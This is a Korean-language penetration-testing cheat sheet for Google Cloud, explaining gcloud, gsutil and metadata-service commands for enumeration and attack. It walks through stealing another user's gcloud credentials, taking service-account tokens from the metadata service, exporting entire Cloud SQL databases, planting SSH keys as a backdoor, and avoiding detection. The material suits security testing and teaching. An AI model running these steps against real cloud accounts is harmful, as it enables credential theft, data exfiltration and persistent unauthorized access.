---
sidebar_position: 4
---

# GCP (Google Cloud Platform)

## 기본 정보

Google Cloud Platform은 구글의 클라우드 컴퓨팅 플랫폼입니다. AWS, Azure와 함께 3대 클라우드 서비스입니다.

**주요 서비스:**
- **Compute Engine**: 가상 머신 (AWS EC2와 유사)
- **Cloud Storage**: 객체 스토리지 (AWS S3와 유사)
- **Cloud Functions**: 서버리스 함수 (AWS Lambda와 유사)
- **Cloud SQL**: 관리형 데이터베이스
- **GKE**: Kubernetes 클러스터

**주요 도구:**
- **gcloud CLI**: 명령줄 도구
- **gsutil**: Cloud Storage 전용 도구
- **kubectl**: Kubernetes 관리 도구

---

## 인증 (Authentication)

### 사용자 로그인

```bash
gcloud auth login
```

**💡 설명:**
Google 계정으로 gcloud CLI에 로그인합니다.

**📌 인증 방식:**
- 웹 브라우저가 열림
- Google 계정으로 로그인
- 토큰이 로컬에 저장

**🎯 사용 시기:**
- GCP 리소스 접근 전 필수
- 새로운 자격증명 획득 시

### 서비스 계정 로그인

```bash
gcloud auth activate-service-account --key-file creds.json
```

**💡 설명:**
서비스 계정 JSON 키 파일로 인증합니다.

**📌 서비스 계정이란?**
- 사람이 아닌 애플리케이션용 계정
- JSON 키 파일로 인증
- API, 자동화에 사용

**📌 주요 옵션:**
- `--key-file`: JSON 키 파일 경로

**🎯 사용 시기:**
- 서비스 계정 키를 발견했을 때
- 파일 시스템에서 `*.json` 키 파일 찾기
- GitHub, 설정 파일에서 노출된 키

**예제:**
```bash
# 서비스 계정 키 검색
find / -name "*service*.json" 2>/dev/null
find / -name "*gcp*.json" 2>/dev/null
```

### 계정 목록

```bash
gcloud auth list
```

**💡 설명:**
현재 사용 가능한 모든 인증된 계정을 나열합니다.

**📤 출력 정보:**
- 계정 이름
- 활성화 여부 (*)
- 계정 타입 (사용자/서비스)

**🎯 사용 시기:**
- 여러 계정이 설정되어 있는지 확인
- 권한이 높은 계정 찾기

---

## 계정 정보

### 현재 설정 확인

```bash
gcloud config list
```

**💡 설명:**
현재 gcloud 설정을 확인합니다.

**📤 출력 정보:**
- `account`: 활성 계정
- `project`: 현재 프로젝트
- `region/zone`: 기본 리전/존

**🎯 사용 시기:**
- 어떤 계정/프로젝트를 사용 중인지 확인
- 침투테스트 첫 단계

### 조직 목록

```bash
gcloud organizations list
```

**💡 설명:**
접근 가능한 모든 조직을 나열합니다.

**📌 조직(Organization)이란?**
- GCP 리소스의 최상위 계층
- 회사/기업을 나타냄
- 여러 프로젝트를 포함

**🎯 사용 시기:**
- 조직 구조 파악
- 최상위 권한 확인

### 조직 IAM 정책

```bash
gcloud organizations get-iam-policy <org ID>
```

**💡 설명:**
조직 전체의 IAM 정책을 조회합니다.

**📤 확인 사항:**
- 조직 관리자 (roles/owner)
- 과도한 권한 부여
- 외부 사용자 권한

**🎯 사용 시기:**
- 권한 상승 경로 탐색
- 조직 관리자 파악

### 프로젝트 목록

```bash
gcloud projects list
```

**💡 설명:**
접근 가능한 모든 프로젝트를 나열합니다.

**📌 프로젝트(Project)란?**
- GCP 리소스의 컨테이너
- AWS 계정과 유사
- 리소스는 프로젝트 단위로 관리

**📤 출력 정보:**
- PROJECT_ID
- 이름
- 프로젝트 번호

**🎯 사용 시기:**
- 공격 대상 프로젝트 선정
- 프로젝트별 리소스 조사

### 프로젝트 전환

```bash
gcloud config set project <project name>
```

**💡 설명:**
작업 대상 프로젝트를 변경합니다.

**📌 주요 옵션:**
- `<project name>`: 프로젝트 ID 또는 이름

**🎯 사용 시기:**
- 다른 프로젝트 조사
- 프로젝트별 리소스 접근

### 프로젝트 IAM 정책

```bash
gcloud projects get-iam-policy <project ID>
```

**💡 설명:**
특정 프로젝트의 IAM 정책을 조회합니다.

**📤 확인 사항:**
- 프로젝트 소유자
- Editor, Viewer 역할
- 커스텀 역할

**🎯 사용 시기:**
- 프로젝트 권한 분석
- 권한 상승 가능성 탐색

### 활성화된 API 목록

```bash
gcloud services list
```

**💡 설명:**
현재 프로젝트에서 활성화된 모든 API를 나열합니다.

**📤 확인 사항:**
- Compute Engine API
- Cloud Storage API
- Cloud Functions API
- 민감한 API (Cloud KMS 등)

**🎯 사용 시기:**
- 어떤 서비스가 사용되는지 파악
- 공격 표면 확인

---

## Compute Engine (가상 머신)

### 인스턴스 목록

```bash
gcloud compute instances list
```

**💡 설명:**
모든 Compute Engine 인스턴스를 나열합니다.

**📤 출력 정보:**
- 인스턴스 이름
- Zone
- 상태 (RUNNING, TERMINATED)
- Internal/External IP

**🎯 사용 시기:**
- 실행 중인 VM 파악
- 공격 대상 선정
- 네트워크 구조 이해

### SSH 접속

```bash
gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"
```

**💡 설명:**
Compute Engine 인스턴스에 SSH로 접속합니다.

**📌 주요 옵션:**
- `--zone`: 인스턴스가 있는 존
- `--project`: 프로젝트 ID

**🎯 사용 시기:**
- Compute 권한이 있을 때
- 직접 VM 접근
- 내부 조사

**⚠️ 주의:**
- SSH 키가 메타데이터에 자동 추가됨
- 로그에 기록될 수 있음

### SSH 키 메타데이터에 추가

```bash
gcloud compute ssh <local host>
```

**💡 설명:**
프로젝트 메타데이터에 SSH 공개 키를 추가합니다.

**📌 메타데이터란?**
- 프로젝트 또는 인스턴스 수준의 설정
- 모든 VM이 공유
- SSH 키를 여기 저장

**🎯 사용 시기:**
- 여러 VM에 동시 접근
- 백도어 생성

---

## Cloud Storage (스토리지)

### 버킷 목록

```bash
gsutil ls
```

**💡 설명:**
모든 Cloud Storage 버킷을 나열합니다.

**📌 gsutil이란?**
- Cloud Storage 전용 CLI 도구
- AWS S3 CLI와 유사
- `gs://` 프로토콜 사용

**🎯 사용 시기:**
- 스토리지 리소스 열거
- 민감 데이터 탐색

### 버킷 내용 조회 (재귀)

```bash
gsutil ls -r gs://<bucket name>
```

**💡 설명:**
버킷의 모든 파일과 폴더를 재귀적으로 나열합니다.

**📌 주요 옵션:**
- `-r`: 재귀적 (모든 하위 폴더)
- `-l`: 상세 정보 (크기, 날짜)

**🎯 사용 시기:**
- 버킷 내부 구조 파악
- 파일 검색

**예제:**
```bash
# 모든 PDF 파일 검색
gsutil ls -r gs://company-docs/** | grep .pdf

# 크기와 함께 표시
gsutil ls -l -r gs://company-backups/
```

### 파일 다운로드

```bash
# 단일 파일
gsutil cp gs://bucketid/item ~/

# 폴더 전체
gsutil cp -r gs://bucket-name/folder/ .
```

**💡 설명:**
Cloud Storage에서 파일을 로컬로 복사합니다.

**📌 주요 옵션:**
- `-r`: 재귀적 복사 (폴더)
- `-m`: 멀티스레드 (빠른 복사)

**🎯 사용 시기:**
- 민감 데이터 다운로드
- 백업 파일 분석

---

## Cloud SQL (데이터베이스)

### SQL 인스턴스 목록

```bash
# Cloud SQL
gcloud sql instances list

# Spanner
gcloud spanner instances list

# BigTable
gcloud bigtable instances list
```

**💡 설명:**
각 데이터베이스 서비스의 인스턴스를 나열합니다.

**📌 GCP 데이터베이스 종류:**
- **Cloud SQL**: MySQL, PostgreSQL, SQL Server
- **Spanner**: 글로벌 분산 DB
- **BigTable**: NoSQL (대용량)

**📤 출력 정보:**
- 인스턴스 이름
- DB 버전
- Location
- 상태

### 데이터베이스 목록

```bash
# Cloud SQL
gcloud sql databases list --instance <instance ID>

# Spanner
gcloud spanner databases list --instance <instance name>
```

**💡 설명:**
특정 인스턴스의 모든 데이터베이스를 나열합니다.

**🎯 사용 시기:**
- 어떤 데이터베이스가 있는지 확인
- 민감한 DB 탐색

### SQL 데이터베이스 내보내기

```bash
# 1. 스토리지 버킷 생성
gsutil mb gs://<googlestoragename>

# 2. 서비스 계정에 권한 부여
gsutil acl ch -u <service account> gs://<googlestoragename>

# 3. SQL 데이터베이스 내보내기
gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>

# 4. 다운로드
gsutil cp gs://<googlestoragename>/sqldump.gz .
```

**💡 설명:**
Cloud SQL 데이터베이스를 백업하여 다운로드합니다.

**📌 단계별 설명:**
1. 백업을 저장할 버킷 생성
2. SQL 서비스 계정에 버킷 쓰기 권한
3. 데이터베이스를 버킷으로 내보내기
4. 로컬로 다운로드

**🎯 사용 시기:**
- DB 전체 탈취
- 민감 정보 추출
- CloudSQL Admin 권한 보유 시

**⚠️ 주의:**
- 로그에 기록됨
- 버킷은 나중에 삭제 권장

---

## Source Repositories (코드 저장소)

### 저장소 목록

```bash
gcloud source repos list
```

**💡 설명:**
접근 가능한 모든 소스 코드 저장소를 나열합니다.

**📌 Source Repository란?**
- GCP의 Git 저장소
- GitHub과 유사
- 코드, 설정 파일 저장

**🎯 사용 시기:**
- 소스 코드 접근
- 설정 파일에서 비밀 정보 찾기

### 저장소 클론

```bash
gcloud source repos clone <repo_name>
```

**💡 설명:**
저장소를 로컬로 복제합니다.

**🎯 분석 대상:**
```bash
# 클론 후 민감 정보 검색
cd <repo_name>
grep -r "password" .
grep -r "api_key" .
grep -r "secret" .
grep -r "service_account" .
```

---

## Cloud Functions (서버리스)

### 함수 목록

```bash
gcloud functions list
```

**💡 설명:**
모든 Cloud Functions를 나열합니다.

**📌 Cloud Functions란?**
- 서버리스 함수 (AWS Lambda와 유사)
- 이벤트 기반 실행
- HTTP, Pub/Sub, Storage 트리거

**🎯 사용 시기:**
- 서버리스 애플리케이션 분석
- 코드 및 환경 변수 조사

### 함수 상세 정보

```bash
gcloud functions describe <function name>
```

**💡 설명:**
함수의 상세 정보를 조회합니다.

**📤 출력 정보:**
- 환경 변수
- 트리거 타입
- 런타임 (Python, Node.js 등)
- 서비스 계정

**🎯 주요 확인 사항:**
- 환경 변수에 비밀 정보
- 사용된 서비스 계정 권한
- 소스 코드 위치

### 함수 로그

```bash
gcloud functions logs read <function name> --limit <number of lines>
```

**💡 설명:**
함수의 실행 로그를 조회합니다.

**📤 확인 가능한 것:**
- 에러 메시지
- 디버그 출력
- 민감 정보 (개발자가 실수로 로그 출력)

**🎯 사용 시기:**
- 함수 동작 이해
- 취약점 탐색
- 비밀 정보 누출 확인

---

## Cloud Run (컨테이너 서비스)

### 서비스 목록

```bash
gcloud run services list
```

**💡 설명:**
모든 Cloud Run 서비스를 나열합니다.

**📌 Cloud Run이란?**
- 완전 관리형 컨테이너 실행 환경
- Docker 이미지 실행
- 자동 스케일링

**📤 출력 정보:**
- 서비스 이름
- URL (접근 주소)
- 리전

### 서비스 상세 정보

```bash
gcloud run services describe <service-name>
```

**💡 설명:**
Cloud Run 서비스의 상세 정보를 조회합니다.

**📤 주요 확인 사항:**
- 환경 변수
- 서비스 계정
- 이미지 URL
- 인증 설정 (allUsers 허용?)

### 리비전 상세 정보

```bash
gcloud run revisions describe --region=<region> <revision-name>
```

**💡 설명:**
특정 배포 버전(리비전)의 정보를 조회합니다.

**📌 리비전이란?**
- 서비스의 특정 배포 버전
- 각 배포마다 새로운 리비전 생성
- 이전 버전 추적 가능

**🎯 사용 시기:**
- 환경 변수 변경 이력 확인
- 이전 설정 분석

---

## Kubernetes (GKE)

### 클러스터 목록

```bash
gcloud container clusters list
```

**💡 설명:**
모든 GKE(Google Kubernetes Engine) 클러스터를 나열합니다.

**📌 GKE란?**
- 관리형 Kubernetes 서비스
- AWS EKS, Azure AKS와 유사

**📤 출력 정보:**
- 클러스터 이름
- Location
- 마스터 버전
- 노드 수

### kubectl 설정

```bash
gcloud container clusters get-credentials <cluster name> --region <region>
```

**💡 설명:**
kubectl이 GKE 클러스터에 접근하도록 설정합니다.

**📌 주요 옵션:**
- `<cluster name>`: 클러스터 이름
- `--region`: 리전 또는 존

**🎯 사용 후:**
```bash
# 클러스터 정보
kubectl cluster-info

# 노드 목록
kubectl get nodes

# 모든 파드
kubectl get pods --all-namespaces

# 시크릿 확인
kubectl get secrets --all-namespaces
```

---

## Cloud KMS (암호화 키 관리)

### 암호화된 데이터 복호화

```bash
gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global
```

**💡 설명:**
Cloud KMS로 암호화된 파일을 복호화합니다.

**📌 Cloud KMS란?**
- Key Management Service
- 암호화 키 중앙 관리
- 파일, 데이터베이스 암호화

**📌 주요 옵션:**
- `--ciphertext-file`: 암호화된 파일
- `--plaintext-file`: 복호화된 파일 저장 경로
- `--key`: 암호화 키 이름
- `--keyring`: 키링 이름
- `--location`: 위치 (global, 리전 등)

**🎯 사용 시기:**
- 암호화된 백업 파일 발견 시
- KMS 권한이 있을 때
- 민감 데이터 복호화

---

## 네트워킹

### 네트워크 목록

```bash
gcloud compute networks list
```

**💡 설명:**
모든 VPC 네트워크를 나열합니다.

**📌 VPC란?**
- Virtual Private Cloud
- 격리된 네트워크 환경
- AWS VPC와 동일 개념

### 서브넷 목록

```bash
gcloud compute networks subnets list
```

**💡 설명:**
모든 서브넷을 나열합니다.

**📤 출력 정보:**
- 서브넷 이름
- IP 범위
- 리전
- 네트워크

### VPN 터널 목록

```bash
gcloud compute vpn-tunnels list
```

**💡 설명:**
모든 VPN 터널을 조회합니다.

**🎯 사용 시기:**
- 온프레미스 연결 확인
- 하이브리드 환경 분석

### Interconnects (전용 연결)

```bash
gcloud compute interconnects list
```

**💡 설명:**
전용 네트워크 연결을 조회합니다.

**📌 Interconnects란?**
- 온프레미스와 GCP 간 전용 회선
- 높은 대역폭, 낮은 지연시간

---

## 자격증명 탈취

### gcloud 자격증명 위치

```bash
~/.config/gcloud/credentials.db
```

**💡 설명:**
gcloud CLI가 토큰을 저장하는 SQLite 데이터베이스입니다.

**🎯 공격 시나리오:**
```bash
# 1. 다른 사용자 홈 디렉토리 검색
sudo find /home -name "credentials.db" 2>/dev/null

# 2. gcloud 설정 디렉토리 복사
sudo cp -r /home/victim/.config/gcloud ~/.config

# 3. 소유권 변경
sudo chown -R $(whoami):$(whoami) ~/.config/gcloud

# 4. 계정 확인
gcloud auth list

# 5. 탈취한 자격증명 사용
gcloud projects list
```

**🎯 사용 시기:**
- 리눅스 시스템 침투 후
- 권한 상승
- 수평 이동

---

## 메타데이터 서비스

### 메타데이터 URL

```bash
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
```

**💡 설명:**
Compute Engine 인스턴스의 메타데이터를 조회합니다.

**📌 주요 차이점 (AWS vs GCP):**
- URL: `metadata.google.internal` (AWS는 `169.254.169.254`)
- 헤더 필수: `Metadata-Flavor: Google`

**📤 제공 정보:**
- 인스턴스 ID
- 프로젝트 ID/번호
- 서비스 계정 토큰
- SSH 키

### 서비스 계정 Access Scopes 확인

```bash
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'
```

**💡 설명:**
인스턴스에 부여된 권한 범위를 확인합니다.

**📌 Access Scopes란?**
- VM이 접근할 수 있는 GCP API 범위
- 서비스 계정 권한의 하위 집합
- `cloud-platform`: 모든 권한 (위험!)

**📤 주요 Scopes:**
- `https://www.googleapis.com/auth/cloud-platform`: 전체 권한
- `https://www.googleapis.com/auth/devstorage.read_only`: Storage 읽기
- `https://www.googleapis.com/auth/compute`: Compute 권한

**🎯 사용 시기:**
- VM 침투 후
- SSRF 취약점 발견 시
- 어떤 권한이 있는지 확인

### 서비스 계정 토큰 획득

```bash
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

**💡 설명:**
VM에 부여된 서비스 계정의 액세스 토큰을 획득합니다.

**📤 출력 정보:**
```json
{
  "access_token": "ya29.c.ElqKBxj...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

**🎯 사용 방법:**
```bash
# 토큰 저장
TOKEN=$(curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r .access_token)

# 토큰으로 API 호출
curl -H "Authorization: Bearer $TOKEN" https://www.googleapis.com/compute/v1/projects/<project-id>/zones/<zone>/instances
```

---

## 앱 엔진 (App Engine)

### 앱 인스턴스 목록

```bash
gcloud app instances list
```

**💡 설명:**
App Engine 인스턴스를 나열합니다.

**📌 App Engine이란?**
- PaaS (Platform as a Service)
- 애플리케이션을 자동으로 배포/확장
- 코드만 업로드하면 됨

**🎯 사용 시기:**
- 웹 애플리케이션 조사
- 서비스 취약점 탐색

---

## 참고

### 주요 명령어 요약

- `gcloud auth login`: 로그인
- `gcloud projects list`: 프로젝트 목록
- `gcloud compute instances list`: VM 목록
- `gsutil ls`: 스토리지 버킷 목록
- `gcloud sql instances list`: SQL 인스턴스
- `gcloud functions list`: Cloud Functions

### IAM 역할 (주요)

- **Owner**: 모든 권한 (최고 권한)
- **Editor**: 리소스 생성/수정 (IAM 제외)
- **Viewer**: 읽기 전용
- **Security Admin**: 보안 설정 관리
- **Service Account Admin**: 서비스 계정 관리

### 권한 상승 체크리스트

1. 서비스 계정 JSON 키 탐색
2. gcloud credentials.db 파일 복사
3. 메타데이터 서비스에서 토큰 획득
4. Cloud Functions/Run 환경 변수
5. Cloud SQL 데이터베이스 내보내기
6. Source Repository 클론 및 분석
7. KMS로 암호화된 데이터 복호화

### 메타데이터 서비스 주요 경로

```bash
# 기본 정보
http://metadata.google.internal/computeMetadata/v1/

# 프로젝트 ID
http://metadata.google.internal/computeMetadata/v1/project/project-id

# 서비스 계정 이메일
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email

# 액세스 토큰
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Access Scopes
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

### GCP vs AWS vs Azure

| 항목 | GCP | AWS | Azure |
|------|-----|-----|-------|
| VM | Compute Engine | EC2 | Virtual Machine |
| 스토리지 | Cloud Storage | S3 | Blob Storage |
| 서버리스 | Cloud Functions | Lambda | Functions |
| 컨테이너 | Cloud Run | ECS/Fargate | Container Instances |
| Kubernetes | GKE | EKS | AKS |
| 메타데이터 | metadata.google.internal | 169.254.169.254 | 169.254.169.254 |

### 로그 및 탐지

**Stackdriver (Cloud Logging):**
- 모든 API 호출 기록
- `gcloud` 명령 로깅
- 침투테스트 활동 추적 가능

**탐지 회피:**
- 정상적인 명령어 사용
- 속도 제한
- 업무 시간 내 활동

---

## 관련 도구

- [gcp_enum](https://gitlab.com/gitlab-com/gl-security/threatmanagement/redteam/redteam-public/gcp_enum) - GCP 열거 도구
- [GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute) - Cloud Storage 버킷 검색
- [gcp-iam-privilege-escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation) - GCP 권한 상승 스크립트
- [ScoutSuite](https://github.com/nccgroup/ScoutSuite) - 멀티 클라우드 보안 감사 (GCP 지원)
